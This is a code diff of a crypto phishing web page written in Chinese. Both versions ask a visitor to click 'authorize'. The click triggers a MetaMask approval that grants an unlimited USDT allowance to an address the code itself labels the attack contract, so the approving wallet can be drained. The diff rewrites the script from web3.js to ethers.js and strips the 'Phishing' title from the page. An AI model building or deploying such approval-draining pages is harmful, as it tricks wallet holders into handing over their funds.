@@ -1,49 +1,31 @@
 
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phishing Authorize</title>
+  <meta charset="utf-8">
+  <title>授權頁面</title>
 </head>
 <body>
-  <h2>🔓 授權 USDT（Sepolia 測試網）</h2>
-  <button onclick="approve()">授權最大金額</button>
+  <h2>請點擊下方按鈕授權 USDT</h2>
+  <button onclick="approve()">授權</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const tokenAddress = "0x42A5843bF9980e0773c4f02Bd3d59b8a8f1c3fF"; // ✅ Sepolia 測試網 USDT
-    const spender = "0xfC35E3407c86461BA2D00C080cC763c0f6878377"; // ✅ 你的攻擊合約地址
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    const tokenAddress = "0x42A5843bF9980e0773c4f02Bd3D59b8a8f1c3fF"; // Sepolia fUSDT
+    const spender = "0xfC35E3407c86461BA2D00C080cC763c0f6878377"; // 攻擊合約
 
     const ABI = [
-      {
-        constant: false,
-        inputs: [
-          { name: "_spender", type: "address" },
-          { name: "_value", type: "uint256" }
-        ],
-        name: "approve",
-        outputs: [{ name: "", type: "bool" }],
-        type: "function"
-      }
+      "function approve(address spender, uint256 amount) public returns (bool)"
     ];
 
     async function approve() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("請使用 MetaMask 開啟");
-        return;
-      }
-
-      const web3 = new Web3(window.ethereum);
-      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-      const account = accounts[0];
-
-      const contract = new web3.eth.Contract(ABI, tokenAddress);
-
-      const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      contract.methods.approve(spender, maxUint).send({ from: account })
-        .then(() => alert("授權成功 ✅"))
-        .catch(err => alert("授權失敗 ❌\n" + err.message));
+      await provider.send("eth_requestAccounts", []);
+      const contract = new ethers.Contract(tokenAddress, ABI, signer);
+      const tx = await contract.approve(spender, ethers.constants.MaxUint256);
+      console.log("授權 TX:", tx.hash);
     }
   </script>
 </body>
